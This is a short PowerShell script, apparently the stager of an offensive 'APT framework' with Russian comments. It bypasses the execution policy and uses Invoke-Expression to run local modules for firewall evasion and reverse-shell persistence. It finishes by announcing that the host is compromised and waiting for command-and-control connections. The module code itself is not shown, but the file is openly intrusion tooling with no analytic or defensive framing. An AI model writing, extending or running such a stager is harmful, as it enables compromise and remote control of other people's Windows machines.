<#
.SYNOPSIS
    Master Offensive Orchestrator (Stager)
.DESCRIPTION
    Executes multiple APT modules (Firewall Evasion, Persistence) to compromise a Windows host.
    Designed to be executed with: powershell.exe -ExecutionPolicy Bypass -File .\stager.ps1
#>

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "      WIN-PWN APT FRAMEWORK EXECUTING     " -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta

# Определяем текущую директорию, откуда запущен стейджер, чтобы найти модули
$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition

Write-Host "[*] Stager timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan

# ---------------------------------------------------------
# Запуск Модуля 1: Обход Брандмауэра
# ---------------------------------------------------------
$FirewallModule = Join-Path $ScriptPath "win_pwn_firewall.ps1"
if (Test-Path $FirewallModule) {
    Invoke-Expression (Get-Content $FirewallModule -Raw)
} else {
    Write-Host "[-] Module not found: $FirewallModule" -ForegroundColor Red
}

# ---------------------------------------------------------
# Запуск Модуля 2: Закрепление в системе (Reverse Shell)
# ---------------------------------------------------------
$PersistenceModule = Join-Path $ScriptPath "win_pwn_persistence.ps1"
if (Test-Path $PersistenceModule) {
    Invoke-Expression (Get-Content $PersistenceModule -Raw)
} else {
    Write-Host "[-] Module not found: $PersistenceModule" -ForegroundColor Red
}

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "[+] Host fully compromised. Awaiting C2 connections." -ForegroundColor Green